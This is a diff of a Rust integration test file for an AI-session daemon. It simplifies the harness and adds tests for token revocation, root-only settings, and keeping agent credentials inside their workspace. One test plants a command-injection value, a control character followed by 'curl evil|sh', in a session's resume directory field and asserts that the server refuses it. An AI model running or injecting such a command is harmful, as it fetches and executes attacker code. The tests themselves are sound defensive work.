@@ -12,25 +12,17 @@
 //! - result shaping (row cap + redaction), revoke → cancel, the quiet period,
 //!   the headless fallback, and `no_ui_client`.
 
-use std::sync::Arc;
 use std::time::Duration;
 
 use chrono::Utc;
 use futures_util::{SinkExt, StreamExt};
-use otto_core::secrets::SecretStore;
-use otto_core::{Error, Id, Result};
-use otto_rbac::{AuthRepo, RbacRoleChecker};
+use otto_core::Id;
+use otto_rbac::AuthRepo;
 use otto_server::ServerCtx;
-use otto_sessions::{ProviderRegistry, SessionManager};
-use otto_state::{
-    ConnectionSectionsRepo, ConnectionsRepo, DbExplorerRepo, DbPool, GitStore, IntegrationsRepo,
-    IssuesRepo, NewSession, ProductRepo, ReviewsRepo, SessionsRepo, SkillEvalsRepo, SwarmRepo,
-    WorkspacesRepo,
-};
+use otto_state::{DbPool, NewSession, SessionsRepo};
 use serde_json::{json, Value};
 use sqlx::sqlite::{SqliteConnectOptions, SqlitePoolOptions};
 use tokio::net::TcpStream;
-use tokio::sync::broadcast;
 use tokio_tungstenite::tungstenite::Message;
 use tokio_tungstenite::{MaybeTlsStream, WebSocketStream};
 
@@ -39,34 +31,6 @@ type Ws = WebSocketStream<MaybeTlsStream<TcpStream>>;
 // ---------------------------------------------------------------------------
 // Harness (mirrors canvas_refs_api.rs, with a real base_url + listener)
 // ---------------------------------------------------------------------------
-
-struct NoopSecrets;
-impl SecretStore for NoopSecrets {
-    fn put(&self, _key: &str, _value: &str) -> Result<()> {
-        Err(Error::Internal("noop secrets".into()))
-    }
-    fn get(&self, _key: &str) -> Result<Option<String>> {
-        Err(Error::Internal("noop secrets".into()))
-    }
-    fn delete(&self, _key: &str) -> Result<()> {
-        Err(Error::Internal("noop secrets".into()))
-    }
-}
-
-struct NoopSpawner;
-impl otto_connections::Spawner for NoopSpawner {
-    fn spawn_connection<'a>(
-        &'a self,
-        _ws_id: &'a Id,
-        _user_id: &'a Id,
-        _conn: &'a otto_core::domain::Connection,
-        _spec: otto_pty::CommandSpec,
-        _first_command: Option<String>,
-        _title: Option<String>,
-    ) -> otto_core::auth::BoxFuture<'a, Result<otto_core::domain::Session>> {
-        Box::pin(async { Err(Error::Internal("noop spawner".into())) })
-    }
-}
 
 async fn file_pool(dir: &std::path::Path) -> DbPool {
     let opts = SqliteConnectOptions::new()
@@ -121,144 +85,9 @@ async fn seed_workspace(pool: &DbPool, ws_id: &str, admin: &str) {
 }
 
 async fn test_ctx(pool: &DbPool, base_url: String, tmp: &std::path::Path) -> ServerCtx {
-    let (events, _rx) = broadcast::channel(256);
-    let secrets: Arc<dyn SecretStore> = Arc::new(NoopSecrets);
-    let roles = Arc::new(RbacRoleChecker::new(pool.clone()));
-    let manager = Arc::new(SessionManager::new(
-        SessionsRepo::new(pool.clone()),
-        events.clone(),
-        ProviderRegistry::new(None),
-    ));
-    let orchestrator = Arc::new(otto_orchestrator::Orchestrator::new("claude"));
-    let improve_engine = Arc::new(otto_improve::ImprovementEngine {
-        improvements: otto_state::ImprovementsRepo::new(pool.clone()),
-        sessions: SessionsRepo::new(pool.clone()),
-        workspaces: WorkspacesRepo::new(pool.clone()),
-        producer: Arc::new(otto_improve::RealProposalProducer::new(
-            orchestrator.clone(),
-        )),
-        events: events.clone(),
-        library_root: tmp.join("lib"),
-    });
-    let connections = Arc::new(otto_connections::ConnectionsService::new(
-        ConnectionsRepo::new(pool.clone()),
-        ConnectionSectionsRepo::new(pool.clone()),
-        secrets.clone(),
-    ));
-    let db_explorer = Arc::new(otto_dbviewer::DbViewerService::new(
-        ConnectionsRepo::new(pool.clone()),
-        secrets.clone(),
-        DbExplorerRepo::new(pool.clone()),
-    ));
-    let brokers = Arc::new(otto_brokers::BrokersService::new(
-        otto_state::BrokerClustersRepo::new(pool.clone()),
-        secrets.clone(),
-        None,
-    ));
-    let mcp = Arc::new(otto_mcp::McpService::new(pool.clone(), secrets.clone()));
-    let swarm_repo = SwarmRepo::new(pool.clone());
-    let swarm = Arc::new(otto_swarm::SwarmService::new(swarm_repo.clone()));
-    let product_repo = ProductRepo::new(pool.clone());
-    let product = Arc::new(otto_product::ProductService::new(
-        product_repo.clone(),
-        IssuesRepo::new(pool.clone()),
-        secrets.clone(),
-    ));
-    let usage = otto_usage::UsageEngine::start(
-        otto_usage::UsageConfig {
-            enabled: false, // This fixture does not exercise metrics or start ClickHouse.
-            ..Default::default()
-        },
-        tmp.join("usage"),
-    )
-    .await;
-    ServerCtx {
-        pool: pool.clone(),
-        secrets,
-        events: events.clone(),
-        authenticator: Arc::new(otto_rbac::RbacAuthenticator::new(pool.clone())),
-        roles,
-        auth_cache: otto_rbac::AuthCache::new(),
-        version: "test".into(),
-        base_url,
-        data_dir: tmp.to_path_buf(),
-        plugins: Arc::new(otto_server::plugins::PluginManager::new(
-            otto_state::PluginsRepo::new(pool.clone()),
-            tmp.join("plugins"),
-            tmp.to_path_buf(),
-            "http://127.0.0.1:7700/api/v1/plugin-host".into(),
-        )),
-        manager,
-        workspaces: WorkspacesRepo::new(pool.clone()),
-        connections,
-        db_explorer,
-        db_assist: otto_server::db_assist::new_registry(),
-        transcript_cache: Default::default(),
-        rooms: Default::default(),
-        brokers,
-        mcp,
-        spawner: Arc::new(NoopSpawner),
-        git_store: GitStore::new(pool.clone()),
-        issues_store: IssuesRepo::new(pool.clone()),
-        integrations_store: IntegrationsRepo::new(pool.clone()),
-        channel_bridge: None,
-        wf_skip_current: Default::default(),
-        reviews_store: ReviewsRepo::new(pool.clone()),
-        findings_store: otto_state::ReviewFindingsRepo::new(pool.clone()),
-        finding_events_store: otto_state::FindingEventsRepo::new(pool.clone()),
-        repo_rules_store: otto_state::RepoRulesRepo::new(pool.clone()),
-        proof_packs_store: otto_state::ReviewProofPacksRepo::new(pool.clone()),
-        skill_evals_store: SkillEvalsRepo::new(pool.clone()),
-        golden_tasks_store: otto_state::GoldenTasksRepo::new(pool.clone()),
-        eval_matrices_store: otto_state::EvalMatricesRepo::new(pool.clone()),
-        skill_eval_cancels: Default::default(),
-        skill_reviews_store: otto_state::SkillReviewsRepo::new(pool.clone()),
-        skill_review_cancels: Default::default(),
-        review_agent_cancels: Default::default(),
-        review_cancels: Default::default(),
-        orchestrator,
-        improve_engine,
-        context_library: otto_context::Library::new(tmp.join("ctx")),
-        usage,
-        telemetry: None,
-        product,
-        product_repo,
-        attachment_repo: otto_state::ProductAttachmentRepo::new(pool.clone()),
-        discovery_repo: otto_state::ProductDiscoveryRepo::new(pool.clone()),
-        refinement_repo: otto_state::ProductRefinementRepo::new(pool.clone()),
-        mockup_repo: otto_state::ProductMockupRepo::new(pool.clone()),
-        discovery_chat_repo: otto_state::DiscoveryChatRepo::new(pool.clone()),
-        canvas_repo: otto_state::CanvasRepo::new(pool.clone()),
-        product_agent_cancels: otto_server::product_run::new_cancel_registry(),
-        design_jobs: otto_server::design_blender::new_job_registry(),
-        memory: Arc::new(otto_memory::MemoryService::with_defaults(pool.clone())),
-        vault: Arc::new(otto_vault::VaultEngine::new(pool.clone())),
-        vault_docs_runs: otto_server::vault_docs_agent::new_run_registry(),
-        vault_docs_refine: otto_server::vault_docs_agent::new_refine_registry(),
-        swarm,
-        swarm_repo,
-        swarm_coords: otto_server::swarm_runtime::new_registry(),
-        swarm_run_cancels: otto_server::swarm_run::new_cancel_registry(),
-        goal_loops_repo: otto_state::GoalLoopsRepo::new(pool.clone()),
-        goal_loops: otto_server::goal_loop::new_registry(),
-        workgraph: Arc::new(otto_workgraph::WorkGraphService::new(
-            otto_state::WorkGraphRepo::new(pool.clone()),
-            events.clone(),
-        )),
-        scheduled_tasks: otto_state::ScheduledTasksRepo::new(pool.clone()),
-        proof_repo: otto_state::ProofRepo::new(pool.clone()),
-        proof_locks: otto_server::proof::new_locks(),
-        runs: otto_state::RunsRepo::new(pool.clone()),
-        runs_engine: otto_server::run_engine::RunEngine::new(),
-        browser_tabs: otto_state::BrowserTabsRepo::new(pool.clone()),
-        browser_annotations: otto_state::BrowserAnnotationsRepo::new(pool.clone()),
-        browser_credentials: otto_state::BrowserCredentialsRepo::new(pool.clone()),
-        ui_bridge: Default::default(),
-        browser: Arc::new(otto_server::routes::browser::BrowserEngineHandle::new(
-            None,
-            tmp.join("browser"),
-        )),
-    }
+    let mut ctx = ServerCtx::for_tests(pool, tmp).await;
+    ctx.base_url = base_url;
+    ctx
 }
 
 struct Daemon {
@@ -276,6 +105,11 @@ struct Daemon {
 /// device `dev1`; `human` is alice's own API token, `agent` the session's
 /// managed token, `bob` another (non-root) user's token.
 async fn boot() -> Daemon {
+    boot_with(false).await
+}
+
+/// [`boot`], optionally with the daemon's cached authenticator (S8-302).
+async fn boot_with(cached_auth: bool) -> Daemon {
     let tmp = tempfile::tempdir().unwrap();
     let pool = file_pool(tmp.path()).await;
     seed_user(&pool, "alice", true).await;
@@ -312,7 +146,10 @@ async fn boot() -> Daemon {
     let listener = tokio::net::TcpListener::bind("127.0.0.1:0").await.unwrap();
     let addr = listener.local_addr().unwrap();
     let base = format!("http://{addr}");
-    let ctx = test_ctx(&pool, base.clone(), tmp.path()).await;
+    let mut ctx = test_ctx(&pool, base.clone(), tmp.path()).await;
+    if cached_auth {
+        ctx = ctx.with_cached_auth(&pool);
+    }
     otto_server::ui_bridge::spawn_session_watch(ctx.clone());
     // The production module composition (sessions, connections, dbviewer, …).
     let (api_extras, root_extras) = otto_server::modules::module_routers(&ctx);
@@ -334,10 +171,19 @@ async fn boot() -> Daemon {
 
 impl Daemon {
     async fn ws(&self, token: &str) -> Ws {
-        let (ws, _) =
-            tokio_tungstenite::connect_async(format!("{}/ws/events?token={token}", self.ws_base))
-                .await
-                .expect("ws connect");
+        use tokio_tungstenite::tungstenite::client::IntoClientRequest;
+        // The bearer rides in the `otto-bearer` subprotocol — the only place
+        // `/ws/events` accepts it (S11-312).
+        let mut req = format!("{}/ws/events", self.ws_base)
+            .into_client_request()
+            .unwrap();
+        req.headers_mut().insert(
+            "sec-websocket-protocol",
+            format!("otto-bearer, {token}").parse().unwrap(),
+        );
+        let (ws, _) = tokio_tungstenite::connect_async(req)
+            .await
+            .expect("ws connect");
         ws
     }
 
@@ -793,4 +639,187 @@ async fn only_session_credentials_drive_and_only_their_owners_windows() {
         .unwrap();
     assert_eq!(out["code"], "no_ui_client", "{out}");
     assert!(!gets(&mut bobs, "ui_command", Duration::from_millis(300)).await);
+}
+
+/// S8-302: the same, with the daemon's auth cache ENABLED and primed. Logout
+/// revokes through a cache-less repo; the shared cache must still be evicted,
+/// so REST refuses the token at once and the socket closes within ~2 s (not
+/// at the 60 s re-check, which a stale cache hit used to defer it to).
+#[tokio::test]
+async fn events_socket_closes_on_revoke_with_the_auth_cache_on() {
+    let d = boot_with(true).await;
+    let me = |tok: &str| {
+        d.http
+            .get(format!("{}/api/v1/auth/me", d.base))
+            .bearer_auth(tok.to_string())
+            .send()
+    };
+    // Prime the cache with a REST hit, then open the socket.
+    assert_eq!(me(&d.bob).await.unwrap().status().as_u16(), 200);
+    let mut ws = d.ws(&d.bob).await;
+    let status = d
+        .http
+        .post(format!("{}/api/v1/auth/logout", d.base))
+        .bearer_auth(&d.bob)
+        .send()
+        .await
+        .unwrap()
+        .status()
+        .as_u16();
+    assert_eq!(status, 204);
+    assert_eq!(
+        me(&d.bob).await.unwrap().status().as_u16(),
+        401,
+        "a revoked token must not be served from the auth cache"
+    );
+    let closed = tokio::time::timeout(Duration::from_millis(2500), async {
+        while let Some(msg) = ws.next().await {
+            match msg {
+                Ok(Message::Close(frame)) => return frame.map(|f| u16::from(f.code)),
+                Ok(_) => continue,
+                Err(_) => return None,
+            }
+        }
+        None
+    })
+    .await
+    .expect("the revoked socket must close within ~2 s with the cache on");
+    assert_eq!(closed, Some(4401));
+}
+
+/// S8-03: an open `/ws/events` socket is re-validated — revoking its token
+/// (here: a logout with it) closes the socket with 4401 promptly, instead of
+/// streaming events as that identity forever.
+#[tokio::test]
+async fn events_socket_closes_when_its_token_is_revoked() {
+    let d = boot().await;
+    let mut ws = d.ws(&d.bob).await;
+    let mut other = d.ws(&d.human).await;
+    let status = d
+        .http
+        .post(format!("{}/api/v1/auth/logout", d.base))
+        .bearer_auth(&d.bob)
+        .send()
+        .await
+        .unwrap()
+        .status()
+        .as_u16();
+    assert_eq!(status, 204, "logout revokes the presented token");
+    let closed = tokio::time::timeout(Duration::from_secs(5), async {
+        while let Some(msg) = ws.next().await {
+            match msg {
+                Ok(Message::Close(frame)) => return frame.map(|f| u16::from(f.code)),
+                Ok(_) => continue,
+                Err(_) => return None,
+            }
+        }
+        None
+    })
+    .await
+    .expect("the revoked socket must close within seconds");
+    assert_eq!(closed, Some(4401), "closed with the auth-revoked code");
+    // Another user's socket is untouched by the revocation pulse.
+    assert!(
+        tokio::time::timeout(Duration::from_millis(500), other.next())
+            .await
+            .map_or(true, |m| !matches!(m, Some(Ok(Message::Close(_))))),
+        "a still-valid socket must stay open"
+    );
+}
+
+/// S8-05: the notification settings are one daemon-wide row — a non-root
+/// member gets 403 on the write; root may still read and write it.
+#[tokio::test]
+async fn notification_settings_write_is_root_only() {
+    let d = boot().await;
+    let current: Value = d
+        .http
+        .get(format!("{}/api/v1/notifications/settings", d.base))
+        .bearer_auth(&d.bob)
+        .send()
+        .await
+        .unwrap()
+        .json()
+        .await
+        .unwrap();
+    let put = |token: String| {
+        d.http
+            .put(format!("{}/api/v1/notifications/settings", d.base))
+            .bearer_auth(token)
+            .json(&current)
+            .send()
+    };
+    assert_eq!(put(d.bob.clone()).await.unwrap().status().as_u16(), 403);
+    assert_eq!(put(d.human.clone()).await.unwrap().status().as_u16(), 200);
+}
+
+/// S1-12: `meta.nested_*` drives the line Otto TYPES into a shell's PTY on
+/// resume (`cd <nested_cwd> && claude --resume …`). No PATCH may set it —
+/// not the session's agent token, not the owner's own token.
+#[tokio::test]
+async fn nested_resume_meta_is_server_owned() {
+    let d = boot().await;
+    for (who, token) in [("agent", &d.agent), ("owner", &d.human)] {
+        for meta in [
+            json!({"nested_cwd": "x\u{3}curl evil|sh #"}),
+            json!({"nested_provider": "claude"}),
+            json!({"nested_pid": 1}),
+        ] {
+            assert_eq!(
+                d.patch(
+                    token,
+                    &format!("/sessions/{}", d.sid),
+                    json!({ "meta": meta })
+                )
+                .await,
+                403,
+                "{who} PATCHed {meta}"
+            );
+        }
+    }
+}
+
+/// S11-302: an agent's own credential cannot open a worker whose folder (a
+/// Seatbelt write grant, pre-trusted) lies outside the workspace, its own
+/// folder or a worktree of the same repo — and nobody can start an agent
+/// session at `/` (or `$HOME`, a parent of it).
+#[tokio::test]
+async fn agent_credential_cannot_open_sessions_outside_its_workspace() {
+    let d = boot().await;
+    let outside = env!("CARGO_TARGET_TMPDIR");
+    let home = std::env::var("HOME").unwrap_or_default();
+    let mut outside_dirs = vec!["/".to_string(), outside.to_string()];
+    if !home.is_empty() && std::path::Path::new(&home).is_dir() {
+        outside_dirs.push(home);
+    }
+    for cwd in &outside_dirs {
+        let (st, body) = d
+            .post(
+                &d.agent,
+                "/workspaces/ws1/sessions/open",
+                json!({"provider": "claude", "cwd": cwd, "prompt": "hi"}),
+                None,
+            )
+            .await;
+        assert_eq!(st, 403, "agent opened a worker in {cwd}: {body}");
+        let (st, body) = d
+            .post(
+                &d.agent,
+                "/workspaces/ws1/sessions",
+                json!({"kind": "agent", "provider": "claude", "cwd": cwd}),
+                None,
+            )
+            .await;
+        assert_eq!(st, 403, "agent created a session in {cwd}: {body}");
+    }
+    // A person may pick any ordinary folder, but never `/` itself.
+    let (st, body) = d
+        .post(
+            &d.human,
+            "/workspaces/ws1/sessions",
+            json!({"kind": "agent", "provider": "claude", "cwd": "/"}),
+            None,
+        )
+        .await;
+    assert_eq!(st, 400, "a session at / must be refused: {body}");
 }
